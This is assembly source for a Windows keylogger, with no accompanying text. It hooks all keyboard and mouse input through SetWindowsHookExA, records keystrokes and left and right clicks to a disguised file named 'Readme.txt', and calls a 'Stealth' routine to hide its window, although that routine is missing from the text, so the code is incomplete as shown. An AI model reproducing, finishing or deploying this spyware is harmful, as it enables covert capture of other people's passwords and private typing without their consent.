format PE GUI
entry start

include 'win32a.inc'

section '.data' data readable writeable
    hook dd 0
    mouse_hook dd 0
    msg MSG
    log_file dd 0
    log_file1 dd 0
    stealth_window dd 0
    readme_txt db 'Readme.txt', 0
    mode_a_plus db 'a+', 0
    right_click db ' [RIGHT-CLICK] ', 0
    left_click db ' [LEFT-CLICK] ', 0
    success_msg db 'Hookies installed', 13, 10, 0
    error_msg db 'Error creating hook', 13, 10, 0
    color_cmd db 'COLOR 2', 0
    key_buffer db 32 dup(0)
    newline db 13, 10, 0

section '.code' code readable executable
start:
    call Stealth
    push 0
    push 0
    push KeyboardProc
    push WH_KEYBOARD_LL
    call [SetWindowsHookExA]
    mov [hook], eax
    push 0
    push 0
    push MouseProc
    push WH_MOUSE_LL
    call [SetWindowsHookExA]
    mov [mouse_hook], eax
    cmp dword [hook], 0
    je hook_failed
    cmp dword [mouse_hook], 0
    je hook_failed
    push success_msg
    call [puts]
    add esp, 4
    jmp message_loop

hook_failed:
    push color_cmd
    call [system]
    add esp, 4
    push error_msg
    call [puts]
    add esp, 4

message_loop:
    push 0
    push 0
    push 0
    push msg
    call [GetMessageA]
    cmp eax, 0
    jle exit_program
    push msg
    call [TranslateMessage]
    push msg
    call [DispatchMessageA]
    jmp message_loop

exit_program:
    cmp dword [hook], 0
    je skip_unhook_kb
    push dword [hook]
    call [UnhookWindowsHookEx]
skip_unhook_kb:
    cmp dword [mouse_hook], 0
    je skip_unhook_mouse
    push dword [mouse_hook]
    call [UnhookWindowsHookEx]
skip_unhook_mouse:
    push 0
    call [ExitProcess]


KeyboardProc:
    push ebp
    mov ebp, esp
    push ebx
    push esi
    push edi
    cmp dword [ebp+8], 0
    jl call_next_hook
    mov eax, dword [ebp+12]
    cmp eax, WM_KEYDOWN
    jne call_next_hook
    mov ebx, dword [ebp+16]
    mov eax, dword [ebx]
    cmp eax, 32
    jl special_key
    cmp eax, 126
    jg special_key
    mov byte [key_buffer], al
    mov byte [key_buffer+1], 0
    jmp log_key

special_key:
    cmp eax, VK_SPACE
    je space_key
    cmp eax, VK_RETURN
    je enter_key
    cmp eax, VK_BACK
    je backspace_key
    cmp eax, VK_TAB
    je tab_key
    jmp call_next_hook

space_key:
    mov dword [key_buffer], ' '
    jmp log_key

enter_key:
    mov word [key_buffer], 0x0A0D
    mov byte [key_buffer+2], 0
    jmp log_key

backspace_key:
    mov dword [key_buffer], '[BS]'
    mov byte [key_buffer+4], 0
    jmp log_key

tab_key:
    mov dword [key_buffer], '[TAB'
    mov byte [key_buffer+4], ']'
    mov byte [key_buffer+5], 0

log_key:
    push mode_a_plus
    push readme_txt
    call [fopen]
    add esp, 8
    mov [log_file], eax
    cmp eax, 0
    je call_next_hook
    push dword [log_file]
    push key_buffer
    call [fputs]
    add esp, 8
    push dword [log_file]
    call [fclose]
    add esp, 4

call_next_hook:
    push dword [ebp+16]
    push dword [ebp+12]
    push dword [ebp+8]
    push dword [hook]
    call [CallNextHookEx]
    pop edi
    pop esi
    pop ebx
    mov esp, ebp
    pop ebp
    ret 12

MouseProc:
    push ebp
    mov ebp, esp
    push ebx
    push esi
    push edi
    cmp dword [ebp+8], 0
    jl call_next_mouse_hook
    mov eax, dword [ebp+12]
    cmp eax, WM_RBUTTONDOWN
    je right_click_action
    cmp eax, WM_LBUTTONDOWN
    je left_click_action
    jmp call_next_mouse_hook

right_click_action:
    push mode_a_plus
    push readme_txt
    call [fopen]
    add esp, 8
    mov [log_file1], eax
    cmp eax, 0
    je call_next_mouse_hook
    push dword [log_file1]
    push right_click
    call [fputs]
    add esp, 8
    push dword [log_file1]
    call [fclose]
    add esp, 4
    jmp call_next_mouse_hook

left_click_action:
    push mode_a_plus
    push readme_txt
    call [fopen]
    add esp, 8
    mov [log_file1], eax
    cmp eax, 0
    je call_next_mouse_hook
    push dword [log_file1]
    push left_click
    call [fputs]
    add esp, 8
    push dword [log_file1]
    call [fclose]
    add esp, 4

call_next_mouse_hook:
    push dword [ebp+16]
    push dword [ebp+12]
    push dword [ebp+8]
    push dword [mouse_hook]
    call [CallNextHookEx]
    pop edi
    pop esi
    pop ebx
    mov esp, ebp
    pop ebp
    ret 12

section '.idata' import data readable writeable
    library kernel32, 'kernel32.dll',\
            user32, 'user32.dll',\
            msvcrt, 'msvcrt.dll'
    import kernel32,\
           GetConsoleWindow, 'GetConsoleWindow',\
           ExitProcess, 'ExitProcess'
    import user32,\
           SetWindowsHookExA, 'SetWindowsHookExA',\
           CallNextHookEx, 'CallNextHookEx',\
           UnhookWindowsHookEx, 'UnhookWindowsHookEx',\
           GetMessageA, 'GetMessageA',\
           TranslateMessage, 'TranslateMessage',\
           DispatchMessageA, 'DispatchMessageA',\
           ShowWindow, 'ShowWindow'
    import msvcrt,\
           fopen, 'fopen',\
           fputs, 'fputs',\
           fclose, 'fclose',\
           puts, 'puts',\
           system, 'system'
